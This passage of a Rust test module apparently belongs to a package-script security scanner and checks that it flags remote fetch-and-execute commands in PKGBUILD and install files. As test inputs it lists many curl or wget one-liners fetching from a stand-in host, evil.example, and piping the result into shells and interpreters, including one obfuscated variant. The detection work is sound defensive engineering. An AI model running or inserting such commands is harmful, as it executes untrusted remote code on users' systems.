            let f = a.scan(payload, Path::new("PKGBUILD"), false);
            assert!(
                f.iter().any(|x| x.id == "EXEC-REMOTE"),
                "Rscript fetch-exec must still fire: {payload:?}"
            );
        }
    }

    #[test]
    fn detects_launcher_path_and_interpreter_fetch_exec() {
        // Task 4050 exhaustive scope: path-prefixed shells (`/bin/sh`),
        // path+launcher (`/usr/bin/env sh`), path interpreters
        // (`/usr/bin/python3`), and the expanded interpreter set must all trip
        // EXEC-REMOTE.
        let a = RemoteExecAnalyzer::new();
        for cmd in [
            "curl -fsSL https://evil.example/x.sh | /bin/sh",
            "curl -fsSL https://evil.example/x.sh | busybox sh",
            "curl -fsSL https://evil.example/x.sh | /usr/bin/env sh",
            "curl -fsSL https://evil.example/x.sh | command busybox sh",
            "busybox sh <(curl -s https://evil.example/i)",
            // interpreters (expanded set + path)
            "curl -fsSL https://evil.example/x | /usr/bin/python3 -",
            "curl -fsSL https://evil.example/x | node",
            "curl -fsSL https://evil.example/x | deno run -",
            "curl -fsSL https://evil.example/x | env python3",
        ] {
            let f = a.scan(cmd, Path::new("PKGBUILD"), false);
            assert!(
                f.iter().any(|x| x.id == "EXEC-REMOTE"),
                "launcher/path/interpreter fetch|exec must be caught: {cmd} -> {f:?}"
            );
        }
    }

    #[test]
    fn detects_interpreter_sink_forms() {
        // Task 4050 round 3 / Class 1: the interpreter sink must mirror the shell
        // forms — process-sub `<(curl)` and `-c|-e "$(curl)"` — not just the pipe.
        let a = RemoteExecAnalyzer::new();
        for cmd in [
            "python3 <(curl -s https://evil.example/i)",
            "perl <(curl -s https://evil.example/i)",
            "node <(curl -s https://evil.example/i)",
            "python3 -c \"$(curl -s https://evil.example/i)\"",
            "perl -e \"$(curl -s https://evil.example/i)\"",
            "node -e \"$(curl -s https://evil.example/i)\"",
            "ruby -e \"$(wget -qO- https://evil.example/i)\"",
        ] {
            let f = a.scan(cmd, Path::new("test.install"), true);
            assert!(
                f.iter().any(|x| x.id == "EXEC-REMOTE"),
                "interpreter sink form must be caught: {cmd} -> {f:?}"
            );
        }
    }

    #[test]
    fn detects_expanded_interpreter_and_shell_list() {
        // Task 4050 round 3 / Class 2 + 3: one per novel interpreter/shell family.
        let a = RemoteExecAnalyzer::new();
        for cmd in [
            "curl -s https://evil.example/x | expect",
            "curl -s https://evil.example/x | guile",
            "curl -s https://evil.example/x | scala",
            "curl -s https://evil.example/x | clojure",
            "curl -s https://evil.example/x | racket",
            "curl -s https://evil.example/x | elixir",
            "curl -s https://evil.example/x | raku",
            "curl -s https://evil.example/x | crystal",
            "curl -s https://evil.example/x | bb",
            "curl -s https://evil.example/x | ts-node",
            "curl -s https://evil.example/x | runhaskell",
            "curl -s https://evil.example/x | toybox sh",
            "curl -s https://evil.example/x | R",
        ] {
            let f = a.scan(cmd, Path::new("PKGBUILD"), false);
            assert!(
                f.iter().any(|x| x.id == "EXEC-REMOTE"),
                "expanded interpreter/shell must be caught: {cmd} -> {f:?}"
            );
        }
    }

    #[test]
    fn detects_generalized_interpreter_eval_forms() {
        // Task 4050 round 4: the interpreter eval sink must not enumerate exact
        // flags — any flags between the interpreter and a `$(curl)` (or a `<<<
        // "$(curl)"` here-string) must fire (php -r, perl -ne, ruby -r..-e,
        // python -B -c, python <<<).
        let a = RemoteExecAnalyzer::new();
        for cmd in [
            "php -r \"$(curl -s https://evil.example/x)\"",
            "perl -ne \"$(curl -s https://evil.example/x)\"",
            "ruby -ropen-uri -e \"$(curl -s https://evil.example/x)\"",
            "python3 -B -c \"$(curl -s https://evil.example/x)\"",
            "python3 <<< \"$(curl -s https://evil.example/x)\"",
        ] {
            let f = a.scan(cmd, Path::new("test.install"), true);
            assert!(
                f.iter().any(|x| x.id == "EXEC-REMOTE"),
                "generalized interpreter eval form must be caught: {cmd} -> {f:?}"
            );
        }
    }

    #[test]
    fn interpreter_eval_no_fp_without_fetch() {
        // An interpreter invocation with NO fetch-substitution must not fire:
        // the generalization keys on `$(curl …)`/`<<< "$(curl)"`, not the flags.
        let a = RemoteExecAnalyzer::new();
        for cmd in [
            "python3 setup.py build",
            "perl Makefile.PL",
            "node build.js",
            "php artisan migrate",
            "python3 -c \"print(1)\"",
            "ruby -e \"puts 1\"",
        ] {
            let f = a.scan(cmd, Path::new("PKGBUILD"), false);
            assert!(
                f.is_empty(),
                "interpreter without a fetch must not fire EXEC-REMOTE: {cmd} -> {f:?}"
            );
        }
    }

    #[test]
    fn fetch_exec_no_fp_on_single_letter_interpreter_substring() {
        // `R`/`bb` must only match as whole words: `| Rfoo` / `| bbtool` must NOT
        // fire EXEC-REMOTE (they may still trip the unrelated FUNC-001 elsewhere).
        let a = RemoteExecAnalyzer::new();
        for cmd in ["curl -s https://x/x | Rfoo", "curl -s https://x/x | bbtool"] {
            let f = a.scan(cmd, Path::new("PKGBUILD"), false);
            assert!(
                !f.iter().any(|x| x.id == "EXEC-REMOTE"),
                "single-letter interpreter substring must not fire EXEC-REMOTE: {cmd} -> {f:?}"
            );
        }
    }

    #[test]
    fn fetch_exec_no_fp_on_non_shell_pipe_target() {
        // The path/launcher generalization must not flag a fetch piped to a
        // non-shell, non-interpreter command.
        let a = RemoteExecAnalyzer::new();
        for cmd in [
            "curl -fsSL https://example.com/x | /usr/bin/tee out",
            "curl -fsSL https://example.com/x | env grep foo",
            "curl -fsSL https://example.com/x | busybox cat",
        ] {
            let f = a.scan(cmd, Path::new("PKGBUILD"), false);
            assert!(
                f.is_empty(),
                "non-shell pipe target must not fire EXEC-REMOTE: {cmd} -> {f:?}"
            );
        }
    }

    #[test]
    fn documented_fetch_exec_in_printed_heredoc_not_flagged() {
        // Task 4050a: a `curl ... | sh` that only appears inside a printed
        // (non-redirected) heredoc is documentation, not execution — must not
        // raise EXEC-REMOTE.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "post_install() {\n  cat <<EOF\n  To set up, run: curl -fsSL https://x.io/i.sh | sh\nEOF\n}",
            Path::new("test.install"),
            true,
        );
        assert!(
            f.is_empty(),
            "documented curl|sh in a printed heredoc must not fire EXEC-REMOTE: {f:?}"
        );
    }

    #[test]
    fn detects_obfuscated_fetch_exec() {
        // Defect #6c: a quote-split `"cu""rl" ... | sh` must be caught via
        // de-obfuscation, and the real URL extracted from the decoded form.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            r#""cu""rl" -fsSL https://evil.example/x.sh | sh"#,
            Path::new("PKGBUILD"),
            false,
        );
        assert_eq!(f.len(), 1, "obfuscated fetch|exec must be caught: {f:?}");
        let urls = f[0].metadata["remote_urls"].as_array().unwrap();
        assert_eq!(urls[0], "https://evil.example/x.sh");
    }

    #[test]
    fn ignores_plain_download_without_exec() {
        // A source download (no exec) must not be flagged here; that's normal.
        let a = RemoteExecAnalyzer::new();
        let f = a.scan(
            "curl -O https://example.com/src.tar.gz",
            Path::new("PKGBUILD"),
            false,
        );
        assert!(f.is_empty());
    }
}
